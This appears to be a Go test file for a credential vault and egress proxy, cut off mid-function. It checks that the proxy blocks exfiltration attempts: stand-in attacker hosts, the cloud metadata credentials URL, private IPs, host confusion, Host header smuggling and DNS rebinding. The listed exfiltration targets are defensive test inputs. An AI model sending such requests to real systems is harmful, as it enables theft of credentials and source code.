package vault_test

import (
	"bufio"
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/vibevalleyhq/vibevalley/internal/vault"
)

type syncBuffer struct {
	mu  sync.Mutex
	buf bytes.Buffer
}

func (b *syncBuffer) Write(p []byte) (int, error) {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.buf.Write(p)
}

func (b *syncBuffer) Bytes() []byte {
	b.mu.Lock()
	defer b.mu.Unlock()
	return bytes.Clone(b.buf.Bytes())
}

type testStack struct {
	store      *vault.Store
	memBackend *vault.MemoryBackend
	tokens     *vault.TokenService
	logBuf     *syncBuffer
}

func newTestStack(t *testing.T, clock func() time.Time) *testStack {
	t.Helper()
	rk, err := vault.GenerateRootKey("rk-proxy-1")
	if err != nil {
		t.Fatal(err)
	}
	kr, err := vault.NewKeyRing(rk)
	if err != nil {
		t.Fatal(err)
	}
	sk, err := vault.GenerateSigningKey("sig-proxy-1")
	if err != nil {
		t.Fatal(err)
	}

	logBuf := &syncBuffer{}
	logger := slog.New(slog.NewJSONHandler(logBuf, &slog.HandlerOptions{Level: slog.LevelDebug}))

	mem := vault.NewMemoryBackend()
	store, err := vault.NewStore(kr, mem,
		vault.WithStoreClock(clock),
		vault.WithStoreLogger(logger),
	)
	if err != nil {
		t.Fatal(err)
	}
	tokens, err := vault.NewTokenService(sk,
		vault.WithTokenClock(clock),
		vault.WithTokenLogger(logger),
	)
	if err != nil {
		t.Fatal(err)
	}
	return &testStack{
		store:      store,
		memBackend: mem,
		tokens:     tokens,
		logBuf:     logBuf,
	}
}

func TestEgressProxyAllowedHostsAndExfiltrationBlocks(t *testing.T) {
	t.Parallel()
	ctx := context.Background()

	now := time.Date(2026, 11, 16, 15, 0, 0, 0, time.UTC)
	stack := newTestStack(t, func() time.Time { return now })

	// Allowed target server.
	var gotUpstreamHeaders http.Header
	allowedSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotUpstreamHeaders = r.Header.Clone()
		if r.URL.Path == "/redirect-evil" {
			http.Redirect(w, r, "https://evil.example.com/steal", http.StatusFound)
			return
		}
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("allowed-ok"))
	}))
	defer allowedSrv.Close()
	allowedURL := mustURL(t, allowedSrv.URL)

	// Disallowed target server simulating an internal/unlisted service on another port.
	var disallowedHit bool
	disallowedSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		disallowedHit = true
		w.WriteHeader(http.StatusOK)
	}))
	defer disallowedSrv.Close()

	// Credential bound ONLY to allowedURL.Host, NOT evil.example.com.
	const gitSecret = "ghp_sensitive_git_secret_do_not_exfil"
	if err := stack.store.Put(ctx, vault.Credential{
		ID:          "cred-git-allowed",
		Kind:        vault.KindGitCredential,
		Name:        "repo",
		TargetHosts: []string{allowedURL.Host},
		Username:    "x-access-token",
		Value:       vault.NewSecret(gitSecret),
	}); err != nil {
		t.Fatal(err)
	}

	proxy, err := vault.NewEgressProxy(stack.store, stack.tokens,
		vault.WithAllowLoopback(true),
		vault.WithEgressClock(func() time.Time { return now }),
		vault.WithEgressLogger(slog.New(slog.NewJSONHandler(stack.logBuf, &slog.HandlerOptions{Level: slog.LevelDebug}))),
	)
	if err != nil {
		t.Fatal(err)
	}
	proxySrv := httptest.NewServer(proxy)
	defer proxySrv.Close()
	proxyURL := mustURL(t, proxySrv.URL)

	issued, err := stack.tokens.Issue(ctx, vault.IssueTokenRequest{
		SessionID:    "sess-exfil-test",
		Capabilities: []string{vault.CapGitRead, vault.CapHTTPEgress},
		AllowedHosts: []string{allowedURL.Host, "*.allowed.example.com", "evil-allowed.example.com"},
	})
	if err != nil {
		t.Fatal(err)
	}

	clientTransport, err := vault.NewProxyClientTransport(proxyURL, issued.Token, nil)
	if err != nil {
		t.Fatal(err)
	}
	client := &http.Client{Transport: clientTransport}

	// 1. Allowed host succeeds and strips capability token before upstream receives it.
	req, _ := http.NewRequest(http.MethodGet, allowedSrv.URL+"/public", nil)
	req.Header.Set("Authorization", "Bearer "+issued.Token.Reveal())
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("allowed request failed: %v", err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK || string(body) != "allowed-ok" {
		t.Fatalf("allowed request status=%d body=%q", resp.StatusCode, string(body))
	}
	if gotUpstreamHeaders.Get(vault.HeaderCapability) != "" || gotUpstreamHeaders.Get(vault.HeaderProxyAuth) != "" {
		t.Fatalf("capability headers leaked to upstream: %+v", gotUpstreamHeaders)
	}

	// 2. Exfiltration attempts MUST be blocked.
	exfilAttempts := []struct {
		name       string
		target     string
		wantStatus int
	}{
		{"arbitrary external domain", "https://attacker.evil.com/steal-code", http.StatusForbidden},
		{"subdomain suffix trick", "https://allowed.example.com.evil.com/steal", http.StatusForbidden},
		{"apex domain vs wildcard", "https://allowed.example.com/steal", http.StatusForbidden},
		{"unlisted loopback port", disallowedSrv.URL + "/internal-admin", http.StatusForbidden},
		{"AWS/GCP metadata IP", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", http.StatusForbidden},
		{"private RFC1918 IP", "http://10.0.0.5:8080/secrets", http.StatusForbidden},
		{"private 192.168 IP", "http://192.168.1.1/router", http.StatusForbidden},
		{"IPv4-mapped IPv6 metadata", "http://[::ffff:169.254.169.254]/latest/meta-data/", http.StatusForbidden},
		{"userinfo host confusion", "https://" + allowedURL.Host + "@evil.com/steal", http.StatusBadRequest},
		{"redirect to evil host via OutboundTransport", allowedSrv.URL + "/redirect-evil", http.StatusForbidden},
	}

	for _, tc := range exfilAttempts {
		t.Run(tc.name, func(t *testing.T) {
			r, rErr := http.NewRequest(http.MethodPost, tc.target, strings.NewReader("stolen=source"))
			if rErr != nil {
				t.Fatalf("NewRequest(%q): %v", tc.target, rErr)
			}
			res, doErr := client.Do(r)
			if tc.name == "redirect to evil host via OutboundTransport" {
				// client follows 302 from allowedSrv to evil.example.com through the proxy, which blocks the 2nd hop!
				if doErr != nil {
					t.Fatalf("unexpected transport err: %v", doErr)
				}
				res.Body.Close()
				if res.StatusCode != http.StatusForbidden {
					t.Fatalf("redirect hop got status %d, want 403", res.StatusCode)
				}
				return
			}
			if doErr != nil {
				t.Fatalf("unexpected transport err: %v", doErr)
			}
			res.Body.Close()
			if res.StatusCode != tc.wantStatus {
				t.Fatalf("exfil %q status=%d, want %d", tc.target, res.StatusCode, tc.wantStatus)
			}
		})
	}
	if disallowedHit {
		t.Fatal("disallowed upstream server was reached!")
	}

	// 3. Confused deputy protection: requesting cred-git-allowed against evil-allowed.example.com is forbidden.
	cdReq, _ := http.NewRequest(http.MethodGet, "https://evil-allowed.example.com/hook", nil)
	cdReq.Header.Set(vault.HeaderCredentialID, "cred-git-allowed")
	cdResp, err := client.Do(cdReq)
	if err != nil {
		t.Fatal(err)
	}
	cdResp.Body.Close()
	if cdResp.StatusCode != http.StatusForbidden {
		t.Fatalf("confused deputy status=%d, want 403", cdResp.StatusCode)
	}

	// 4. CONNECT tunneling MUST be denied.
	connReq, _ := http.NewRequest(http.MethodConnect, "https://"+allowedURL.Host, nil)
	connReq.Header.Set(vault.HeaderCapability, issued.Token.Reveal())
	rec := httptest.NewRecorder()
	proxy.ServeHTTP(rec, connReq)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("CONNECT status=%d, want 403", rec.Code)
	}

	// 5. Host header smuggling in forward proxy mode MUST be denied.
	smuggleReq := httptest.NewRequest(http.MethodGet, allowedSrv.URL+"/ok", nil)
	smuggleReq.Host = "evil.example.com"
	smuggleReq.Header.Set(vault.HeaderCapability, issued.Token.Reveal())
	rec2 := httptest.NewRecorder()
	proxy.ServeHTTP(rec2, smuggleReq)
	if rec2.Code != http.StatusBadRequest {
		t.Fatalf("Host smuggling status=%d, want 400", rec2.Code)
	}

	// 6. Cross-session tunnel replay protection via ContextWithSessionID.
	boundReq := httptest.NewRequest(http.MethodGet, allowedSrv.URL+"/ok", nil)
	boundReq = boundReq.WithContext(vault.ContextWithSessionID(boundReq.Context(), "sess-other"))
	boundReq.Header.Set(vault.HeaderCapability, issued.Token.Reveal())
	rec3 := httptest.NewRecorder()
	proxy.ServeHTTP(rec3, boundReq)
	if rec3.Code != http.StatusForbidden {
		t.Fatalf("cross-session replay status=%d, want 403", rec3.Code)
	}

	// 7. DNS rebinding through proxy's default SafeDialContext MUST be blocked even for allowed wildcard domains.
	var rebindAudits []vault.AuditEvent
	strictProxy, err := vault.NewEgressProxy(stack.store, stack.tokens,
		vault.WithEgressLogger(slog.New(slog.NewJSONHandler(stack.logBuf, &slog.HandlerOptions{Level: slog.LevelDebug}))),
		vault.WithAuditHook(func(ev vault.AuditEvent) {
			rebindAudits = append(rebindAudits, ev)
		}),
		vault.WithHostLookup(func(context.Context, string) ([]net.IPAddr, error) {
			return []net.IPAddr{{IP: net.ParseIP("169.254.169.254")}}, nil
		}),
	)
	if err != nil {
		t.Fatal(err)
	}
	rebindReq := httptest.NewRequest(http.MethodGet, "https://rebind.allowed.example.com/meta", nil)
	rebindReq.Header.Set(vault.HeaderCapability, issued.Token.Reveal())
	rebindRec := httptest.NewRecorder()
	strictProxy.ServeHTTP(rebindRec, rebindReq)
	if rebindRec.Code != http.StatusForbidden {
		t.Fatalf("DNS rebinding proxy status=%d, want 403, body=%s", rebindRec.Code, rebindRec.Body.String())
	}
	if len(rebindAudits) != 1 || rebindAudits[0].Decision != "deny" || rebindAudits[0].Reason != "private_network_blocked" {
		t.Fatalf("expected deny/private_network_blocked audit event on DNS rebind, got %+v", rebindAudits)
	}

	// 8. OutboundTransport RoundTripper directly blocks redirect from allowed host to evil host.
	directClient := &http.Client{Transport: proxy.OutboundTransport()}
	dirReq, _ := http.NewRequest(http.MethodGet, allowedSrv.URL+"/redirect-evil", nil)
	dirReq.Header.Set(vault.HeaderCapability, issued.Token.Reveal())
	if _, err := directClient.Do(dirReq); !errors.Is(err, vault.ErrHostDenied) {
		t.Fatalf("OutboundTransport redirect got %v, want ErrHostDenied", err)
	}

	// 9. Expired token MUST be rejected with 401.
	now = now.Add(15 * time.Minute)
	expReq, _ := http.NewRequest(http.MethodGet, allowedSrv.URL+"/ok", nil)
	expResp, err := client.Do(expReq)
	if err != nil {
		t.Fatal(err)
	}
	expResp.Body.Close()
	if expResp.StatusCode != http.StatusUnauthorized {
		t.Fatalf("expired token status=%d, want 401", expResp.StatusCode)
	}
}

func TestEndToEndMockGitAndMCPSecretSubstitutionZeroPlaintextLeaks(t *testing.T) {
	t.Parallel()
	ctx := context.Background()

	const (
		rawGitToken     = "ghp_REAL_GIT_SECRET_E2E_XYZ_777"
		rawMCPToken     = "mcp_REAL_OAUTH_SECRET_E2E_ABC_888"
		rawMCPRefresh   = "mcp_REAL_REFRESH_SECRET_E2E_DEF_999"
		rawProviderKey  = "sk-ant-REAL_PROVIDER_SECRET_E2E_123"
		rawRootKeyBytes = "0123456789abcdef0123456789abcdef"
		rawSigningBytes = "fedcba9876543210fedcba9876543210"
	)

	// Run full E2E suite against both MemoryBackend and SQLBackend.
	for _, backendKind := range []string{"memory", "sql"} {
		t.Run(backendKind, func(t *testing.T) {
			rk, err := vault.NewRootKey("rk-e2e", []byte(rawRootKeyBytes))
			if err != nil {
				t.Fatal(err)
			}
			kr, err := vault.NewKeyRing(rk)
			if err != nil {
				t.Fatal(err)
			}
			sk, err := vault.NewSigningKey("sig-e2e", []byte(rawSigningBytes))
			if err != nil {
				t.Fatal(err)
			}

			logBuf := &syncBuffer{}
			logger := slog.New(slog.NewJSONHandler(logBuf, &slog.HandlerOptions{Level: slog.LevelDebug}))

			var (
				backend vault.Backend
				memDB   *memSQLDB
				memB    *vault.MemoryBackend
			)
			if backendKind == "memory" {
				memB = vault.NewMemoryBackend()
				backend = memB
			} else {
				var sqlB *vault.SQLBackend
				sqlB, memDB = openTestSQLBackend(t, vault.DialectSQLite)
				backend = sqlB
			}

			now := time.Date(2026, 11, 16, 16, 0, 0, 0, time.UTC)
			store, err := vault.NewStore(kr, backend,
				vault.WithStoreClock(func() time.Time { return now }),
				vault.WithStoreLogger(logger),
			)
			if err != nil {
				t.Fatal(err)
			}
			tokens, err := vault.NewTokenService(sk,
				vault.WithTokenClock(func() time.Time { return now }),
				vault.WithTokenLogger(logger),
			)
			if err != nil {
				t.Fatal(err)
			}

			// Mock Git Smart HTTP server validating Basic auth and ensuring zero capability token leakage.
			expectedGitAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte("x-access-token:"+rawGitToken))
			gitSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				if r.Header.Get(vault.HeaderCapability) != "" || r.Header.Get(vault.HeaderProxyAuth) != "" {
					http.Error(w, "capability token leaked", http.StatusBadRequest)
					return
				}
				if r.Header.Get("Authorization") != expectedGitAuth {
					http.Error(w, "missing or invalid git credentials", http.StatusUnauthorized)
					return
				}
				switch r.URL.Path {
				case "/org/repo.git/info/refs":
					svc := r.URL.Query().Get("service")
					w.Header().Set("Content-Type", fmt.Sprintf("application/x-%s-advertisement", svc))
					_, _ = fmt.Fprintf(w, "refs:%s", svc)
				case "/org/repo.git/git-upload-pack":
					_, _ = w.Write([]byte("PACK-DATA-READ-OK"))
				case "/org/repo.git/git-receive-pack":
					_, _ = w.Write([]byte("PUSH-ACCEPTED-OK"))
				default:
					http.NotFound(w, r)
				}
			}))
			defer gitSrv.Close()
			gitURL := mustURL(t, gitSrv.URL)

			// Mock MCP server supporting JSON-RPC tool calls and SSE streaming.
			expectedMCPAuth := "Bearer " + rawMCPToken
			mcpSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				if r.Header.Get(vault.HeaderCapability) != "" || r.Header.Get(vault.HeaderProxyAuth) != "" {
					http.Error(w, "capability token leaked", http.StatusBadRequest)
					return
				}
				if r.Header.Get("Authorization") != expectedMCPAuth {
					http.Error(w, "missing or invalid mcp token", http.StatusUnauthorized)
					return
				}
				if r.URL.Path == "/sse" {
					w.Header().Set("Content-Type", "text/event-stream")
					flusher := w.(http.Flusher)
					for _, chunk := range []string{"event: ready\ndata: {\"ok\":true}\n\n", "event: tool\ndata: {\"done\":true}\n\n"} {
						_, _ = io.WriteString(w, chunk)
						flusher.Flush()
					}
					return
				}
				w.Header().Set("Content-Type", "application/json")
				_, _ = w.Write([]byte(`{"jsonrpc":"2.0","id":1,"result":{"issues":42}}`))
			}))
			defer mcpSrv.Close()
			mcpURL := mustURL(t, mcpSrv.URL)

			// Mock Provider API server expecting x-api-key header.
			providerSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				if r.Header.Get("x-api-key") != rawProviderKey {
					http.Error(w, "invalid api key", http.StatusUnauthorized)
					return
				}
				if r.Header.Get(vault.HeaderCapability) != "" {
					http.Error(w, "capability token leaked", http.StatusBadRequest)
					return
				}
				_, _ = w.Write([]byte(`{"id":"msg_1","ok":true}`))
			}))
			defer providerSrv.Close()
			providerURL := mustURL(t, providerSrv.URL)

			// Store all three encrypted credentials in vault.
			if err := store.Put(ctx, vault.Credential{
				ID:          "e2e-git",
				Kind:        vault.KindGitCredential,
				Name:        "github-e2e",
				TargetHosts: []string{gitURL.Host},
				Username:    "x-access-token",
				Value:       vault.NewSecret(rawGitToken),
			}); err != nil {
				t.Fatal(err)
			}
			if err := store.Put(ctx, vault.Credential{
				ID:           "e2e-mcp",
				Kind:         vault.KindMCPOAuthToken,
				Name:         "linear-e2e",
				TargetHosts:  []string{mcpURL.Host},
				TokenType:    "Bearer",
				Value:        vault.NewSecret(rawMCPToken),
				RefreshToken: vault.NewSecret(rawMCPRefresh),
			}); err != nil {
				t.Fatal(err)
			}
			if err := store.Put(ctx, vault.Credential{
				ID:          "e2e-provider",
				Kind:        vault.KindProviderAPIKey,
				Name:        "anthropic-e2e",
				Provider:    "anthropic",
				TargetHosts: []string{providerURL.Host},
				Value:       vault.NewSecret(rawProviderKey),
			}); err != nil {
				t.Fatal(err)
			}

			proxy, err := vault.NewEgressProxy(store, tokens,
				vault.WithAllowLoopback(true),
				vault.WithEgressClock(func() time.Time { return now }),
				vault.WithEgressLogger(logger),
			)
			if err != nil {
				t.Fatal(err)
			}
			proxySrv := httptest.NewServer(proxy)
			defer proxySrv.Close()
			proxyURL := mustURL(t, proxySrv.URL)

			// 1. Read-only Git + MCP token: Git fetch & MCP succeed; Git push MUST be denied!
			readToken, err := tokens.Issue(ctx, vault.IssueTokenRequest{
				SessionID:    "sess-e2e-1",
				PrincipalID:  "machine-e2e",
				Capabilities: []string{vault.CapGitRead, vault.CapMCPCall},
				AllowedHosts: []string{gitURL.Host, mcpURL.Host},
			})
			if err != nil {
				t.Fatal(err)
			}

			// Sandbox holds ONLY readToken — zero real secrets.
			sandboxClientTransport, err := vault.NewProxyClientTransport(proxyURL, readToken.Token, nil)
			if err != nil {
				t.Fatal(err)
			}
			sandboxClient := &http.Client{Transport: sandboxClientTransport}

			// Git info/refs + upload-pack succeeds with proxy-injected Basic auth.
			refsResp, err := sandboxClient.Get(gitSrv.URL + "/org/repo.git/info/refs?service=git-upload-pack")
			if err != nil {
				t.Fatal(err)
			}
			refsBody, _ := io.ReadAll(refsResp.Body)
			refsResp.Body.Close()
			if refsResp.StatusCode != http.StatusOK || string(refsBody) != "refs:git-upload-pack" {
				t.Fatalf("git info/refs failed: status=%d body=%q", refsResp.StatusCode, string(refsBody))
			}

			uploadResp, err := sandboxClient.Post(gitSrv.URL+"/org/repo.git/git-upload-pack", "application/x-git-upload-pack-request", strings.NewReader("want"))
			if err != nil {
				t.Fatal(err)
			}
			uploadBody, _ := io.ReadAll(uploadResp.Body)
			uploadResp.Body.Close()
			if uploadResp.StatusCode != http.StatusOK || string(uploadBody) != "PACK-DATA-READ-OK" {
				t.Fatalf("git upload-pack failed: status=%d body=%q", uploadResp.StatusCode, string(uploadBody))
			}

			// Git push with read-only token MUST be blocked (403).
			pushDeniedResp, err := sandboxClient.Post(gitSrv.URL+"/org/repo.git/git-receive-pack", "application/x-git-receive-pack-request", strings.NewReader("push"))
			if err != nil {
				t.Fatal(err)
			}
			pushDeniedResp.Body.Close()
			if pushDeniedResp.StatusCode != http.StatusForbidden {
				t.Fatalf("git push with read-only token got status=%d, want 403", pushDeniedResp.StatusCode)
			}

			// MCP JSON-RPC call succeeds with proxy-injected Bearer OAuth token.
			mcpResp, err := sandboxClient.Post(mcpSrv.URL+"/mcp", "application/json", strings.NewReader(`{"jsonrpc":"2.0","id":1,"method":"tools/call"}`))
			if err != nil {
				t.Fatal(err)
			}
			mcpBody, _ := io.ReadAll(mcpResp.Body)
			mcpResp.Body.Close()
			if mcpResp.StatusCode != http.StatusOK || !strings.Contains(string(mcpBody), `"issues":42`) {
				t.Fatalf("mcp rpc failed: status=%d body=%q", mcpResp.StatusCode, string(mcpBody))
			}

			// MCP SSE streaming succeeds and flushes chunks.
			sseResp, err := sandboxClient.Get(mcpSrv.URL + "/sse")
			if err != nil {
				t.Fatal(err)
			}
			scanner := bufio.NewScanner(sseResp.Body)
			var sseLines []string
			for scanner.Scan() {
				if line := scanner.Text(); line != "" {
					sseLines = append(sseLines, line)
				}
			}
			sseResp.Body.Close()
			if len(sseLines) != 4 {
				t.Fatalf("unexpected SSE lines: %v", sseLines)
			}

			// 2. Test standard forward HTTP proxy mode (http.ProxyURL + Proxy-Authorization / Basic git pass) for git write.
			writeToken, err := tokens.Issue(ctx, vault.IssueTokenRequest{
				SessionID:    "sess-e2e-1",
				Capabilities: []string{vault.CapGitWrite, vault.CapProviderCall},
				AllowedHosts: []string{gitURL.Host, providerURL.Host},
			})
			if err != nil {
				t.Fatal(err)
			}
			forwardClient := &http.Client{
				Transport: &http.Transport{
					Proxy: http.ProxyURL(proxyURL),
				},
			}
			pushReq, _ := http.NewRequest(http.MethodPost, gitSrv.URL+"/org/repo.git/git-receive-pack", strings.NewReader("push"))
			pushReq.Header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte("x-vibe-capability:"+writeToken.Token.Reveal())))
			pushResp, err := forwardClient.Do(pushReq)
			if err != nil {
				t.Fatal(err)
			}
			pushBody, _ := io.ReadAll(pushResp.Body)
			pushResp.Body.Close()
			if pushResp.StatusCode != http.StatusOK || string(pushBody) != "PUSH-ACCEPTED-OK" {
				t.Fatalf("forward proxy git push failed: status=%d body=%q", pushResp.StatusCode, string(pushBody))
			}

			// 3. Test OutboundTransport RoundTripper directly for Provider API key injection.
			outboundClient := &http.Client{Transport: proxy.OutboundTransport()}
			provReq, _ := http.NewRequest(http.MethodPost, providerSrv.URL+"/v1/messages", strings.NewReader(`{}`))
			provReq.Header.Set(vault.HeaderCapability, writeToken.Token.Reveal())
			provResp, err := outboundClient.Do(provReq)
			if err != nil {
				t.Fatal(err)
			}
			provBody, _ := io.ReadAll(provResp.Body)
			provResp.Body.Close()
			if provResp.StatusCode != http.StatusOK || !strings.Contains(string(provBody), `"ok":true`) {
				t.Fatalf("provider OutboundTransport failed: status=%d body=%q", provResp.StatusCode, string(provBody))
			}

			// 4. Scan ALL stored ciphertexts, metadata, status frames, AND logs for 0 plaintext secret matches.
			var scanBuf bytes.Buffer
			scanBuf.Write(logBuf.Bytes())

			metas, err := store.ListMetadata(ctx)
			if err != nil {
				t.Fatal(err)
			}
			metaJSON, _ := json.Marshal(metas)
			scanBuf.Write(metaJSON)

			envs, err := backend.ListEnvelopes(ctx)
			if err != nil {
				t.Fatal(err)
			}
			for _, env := range envs {
				scanBuf.WriteString(env.SecretID)
				scanBuf.WriteString(env.Name)
				scanBuf.WriteString(env.Provider)
				scanBuf.WriteString(env.RootKeyID)
				scanBuf.Write(env.WrappedDEKNonce)
				scanBuf.Write(env.WrappedDEK)
				scanBuf.Write(env.PayloadNonce)
				scanBuf.Write(env.Ciphertext)
			}
			if memDB != nil {
				memDB.mu.Lock()
				for _, r := range memDB.rows {
					scanBuf.WriteString(r.id + r.kind + r.name + r.targetHostsJSON + r.provider + r.rootKeyID)
					scanBuf.Write(r.wrappedDEKNonce)
					scanBuf.Write(r.wrappedDEK)
					scanBuf.Write(r.payloadNonce)
					scanBuf.Write(r.ciphertext)
				}
				memDB.mu.Unlock()
			}

			corpus := scanBuf.Bytes()
			secretsToScan := []string{
				rawGitToken,
				rawMCPToken,
				rawMCPRefresh,
				rawProviderKey,
				rawRootKeyBytes,
				rawSigningBytes,
				readToken.Token.Reveal(),
				writeToken.Token.Reveal(),
			}
			for _, secret := range secretsToScan {
				if bytes.Contains(corpus, []byte(secret)) {
					t.Fatalf("SECURITY SCAN FAILURE: found plaintext secret %q in stored ciphertexts or logs", secret)
				}
			}
		})
	}
}

func TestVaultConcurrencyUnderRace(t *testing.T) {
	t.Parallel()
	ctx := context.Background()

	stack := newTestStack(t, time.Now)
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer race-secret-token" {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		_, _ = w.Write([]byte("ok"))
	}))
	defer upstream.Close()
	upURL := mustURL(t, upstream.URL)

	if err := stack.store.Put(ctx, vault.Credential{
		ID:          "race-mcp",
		Kind:        vault.KindMCPOAuthToken,
		Name:        "race-srv",
		TargetHosts: []string{upURL.Host},
		Value:       vault.NewSecret("race-secret-token"),
	}); err != nil {
		t.Fatal(err)
	}

	proxy, err := vault.NewEgressProxy(stack.store, stack.tokens,
		vault.WithAllowLoopback(true),
		vault.WithEgressLogger(slog.New(slog.NewJSONHandler(io.Discard, nil))),
	)
	if err != nil {
		t.Fatal(err)
	}
	proxySrv := httptest.NewServer(proxy)
	defer proxySrv.Close()
	proxyURL := mustURL(t, proxySrv.URL)

	issued, err := stack.tokens.Issue(ctx, vault.IssueTokenRequest{
		SessionID:    "sess-race",
		Capabilities: []string{vault.CapMCPCall},
		AllowedHosts: []string{upURL.Host},
	})
	if err != nil {
		t.Fatal(err)
	}

	clientTr, err := vault.NewProxyClientTransport(proxyURL, issued.Token, nil)
	if err != nil {
		t.Fatal(err)
	}
	client := &http.Client{Transport: clientTr}

	var wg sync.WaitGroup
	errs := make(chan error, 64)

	for i := range 24 {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			resp, rErr := client.Get(upstream.URL + fmt.Sprintf("/call/%d", idx))
			if rErr != nil {
				errs <- rErr
				return
			}
			defer resp.Body.Close()
			if resp.StatusCode != http.StatusOK {
				errs <- fmt.Errorf("worker %d got status %d", idx, resp.StatusCode)
			}
		}(i)
	}

	for i := range 4 {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			rk, gErr := vault.GenerateRootKey(fmt.Sprintf("rk-race-%d", idx))
			if gErr != nil {
				errs <- gErr
				return
			}
			if rErr := stack.store.RotateRootKey(ctx, rk); rErr != nil {
				errs <- rErr
			}
		}(i)
	}

	wg.Wait()
	close(errs)
	for e := range errs {
		t.Fatal(e)
	}

	// Confirm the secret still decrypts cleanly after concurrent rotations.
	got, err := stack.store.Get(ctx, "race-mcp")
	if err != nil || got.Value.Reveal() != "race-secret-token" {
		t.Fatalf("post-race Get failed: got=%+v err=%v", got, err)
	}
}

func TestEgressProxyCredentialEdgeCases(t *testing.T) {
	t.Parallel()
	ctx := context.Background()

	now := time.Date(2026, 11, 16, 18, 0, 0, 0, time.UTC)
	stack := newTestStack(t, func() time.Time { return now })

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = io.WriteString(w, r.Header.Get("Authorization"))
	}))
	defer srv.Close()
	srvURL := mustURL(t, srv.URL)

	past := now.Add(-1 * time.Minute)
	if err := stack.store.Put(ctx, vault.Credential{
		ID:          "cred-expired",
		Kind:        vault.KindMCPOAuthToken,
		Name:        "expired",
		TargetHosts: []string{srvURL.Host},
		ExpiresAt:   &past,
		Value:       vault.NewSecret("expired-oauth-secret"),
	}); err != nil {
		t.Fatal(err)
	}

	proxy, err := vault.NewEgressProxy(stack.store, stack.tokens,
		vault.WithAllowLoopback(true),
		vault.WithEgressClock(func() time.Time { return now }),
		vault.WithEgressLogger(slog.New(slog.NewJSONHandler(io.Discard, nil))),
	)
	if err != nil {
		t.Fatal(err)
	}

	tok, err := stack.tokens.Issue(ctx, vault.IssueTokenRequest{
		SessionID:    "sess-edge",
		Capabilities: []string{vault.CapMCPCall},
		AllowedHosts: []string{srvURL.Host},
	})
	if err != nil {
		t.Fatal(err)
	}

	// Expired credential must fail closed.
	recExp := httptest.NewRecorder()
	reqExp := httptest.NewRequest(http.MethodGet, srv.URL+"/mcp", nil)
	reqExp.Header.Set(vault.HeaderCapability, tok.Token.Reveal())
	proxy.ServeHTTP(recExp, reqExp)
	if recExp.Code != http.StatusForbidden || !strings.Contains(recExp.Body.String(), "credential_expired") {
		t.Fatalf("expired credential status=%d body=%s", recExp.Code, recExp.Body.String())
	}

	// Two active credentials on the same host fail closed with 409 unless disambiguated by X-Vibe-Credential-ID.
	_ = stack.store.Delete(ctx, "cred-expired")
	_ = stack.store.Put(ctx, vault.Credential{
		ID:          "cred-mcp-a",
		Kind:        vault.KindMCPOAuthToken,
		Name:        "mcp-a",
		TargetHosts: []string{srvURL.Host},
		Value:       vault.NewSecret("token-alpha-secret"),
	})
	_ = stack.store.Put(ctx, vault.Credential{
		ID:          "cred-mcp-b",
		Kind:        vault.KindMCPOAuthToken,
		Name:        "mcp-b",
		TargetHosts: []string{srvURL.Host},
		Value:       vault.NewSecret("token-beta-secret"),
	})

	recAmb := httptest.NewRecorder()
	reqAmb := httptest.NewRequest(http.MethodGet, srv.URL+"/mcp", nil)
	reqAmb.Header.Set(vault.HeaderCapability, tok.Token.Reveal())
	proxy.ServeHTTP(recAmb, reqAmb)
	if recAmb.Code != http.StatusConflict {
		t.Fatalf("ambiguous credentials status=%d, want 409", recAmb.Code)
	}

	recSel := httptest.NewRecorder()
	reqSel := httptest.NewRequest(http.MethodGet, srv.URL+"/mcp", nil)
	reqSel.Header.Set(vault.HeaderCapability, tok.Token.Reveal())
	reqSel.Header.Set(vault.HeaderCredentialID, "cred-mcp-b")
	proxy.ServeHTTP(recSel, reqSel)
	if recSel.Code != http.StatusOK || recSel.Body.String() != "Bearer token-beta-secret" {
		t.Fatalf("explicit credential select status=%d body=%q", recSel.Code, recSel.Body.String())
	}

	// Missing capability token -> 401.
	recNoTok := httptest.NewRecorder()
	proxy.ServeHTTP(recNoTok, httptest.NewRequest(http.MethodGet, srv.URL+"/mcp", nil))
	if recNoTok.Code != http.StatusUnauthorized {
		t.Fatalf("missing token status=%d, want 401", recNoTok.Code)
	}

	// Conflicting X-Vibe-Target-URL -> 400.
	recConf := httptest.NewRecorder()
	reqConf := httptest.NewRequest(http.MethodGet, srv.URL+"/a", nil)
	reqConf.Header.Set(vault.HeaderTargetURL, srv.URL+"/b")
	reqConf.Header.Set(vault.HeaderCapability, tok.Token.Reveal())
	proxy.ServeHTTP(recConf, reqConf)
	if recConf.Code != http.StatusBadRequest {
		t.Fatalf("conflicting target URL status=%d, want 400", recConf.Code)
	}

	// RequireHTTPS blocks http:// target -> 400.
	httpsProxy, err := vault.NewEgressProxy(stack.store, stack.tokens,
		vault.WithRequireHTTPS(true),
		vault.WithEgressLogger(slog.New(slog.NewJSONHandler(io.Discard, nil))),
	)
	if err != nil {
		t.Fatal(err)
	}
	recHTTP := httptest.NewRecorder()
	reqHTTP := httptest.NewRequest(http.MethodGet, srv.URL+"/mcp", nil)
